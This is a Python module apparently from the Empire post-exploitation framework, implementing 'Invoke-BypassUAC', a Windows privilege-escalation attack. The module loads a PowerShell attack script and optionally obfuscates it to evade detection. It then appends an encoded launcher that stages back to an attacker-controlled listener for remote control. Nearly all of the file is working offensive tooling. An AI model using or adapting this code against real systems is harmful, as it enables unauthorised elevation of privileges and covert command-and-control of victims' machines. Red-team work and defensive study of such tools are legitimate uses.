from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-BypassUAC',

            'Author': ['Leo Davidson', '@meatballs__', '@TheColonial', '@mattifestation', '@harmyj0y', '@sixdub'],

            'Description': ("Runs a BypassUAC attack to escape from a medium integrity process "
                            "to a high integrity process. This attack was originally discovered by Leo Davidson. "
                            "Empire uses components of MSF's bypassuac injection implementation as well as "
                            "an adapted version of PowerSploit's Invoke--Shellcode.ps1 script for backend lifting."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke--Shellcode.ps1',
                'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/bypassuac_injection.rb',
                'https://github.com/rapid7/metasploit-framework/tree/master/external/source/exploits/bypassuac_injection/dll/src',
                'http://www.pretentiousname.com/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            } 
        }
        
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        listenerName = self.options['Listener']['Value']

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-BypassUAC.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

            if launcher == "":
                print helpers.color("[!] Error in launcher generation.")
                return ""
            else:
                scriptEnd = "Invoke-BypassUAC -Command \"%s\"" % (launcher)
                if obfuscate:
                    scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
                script += scriptEnd
                return script
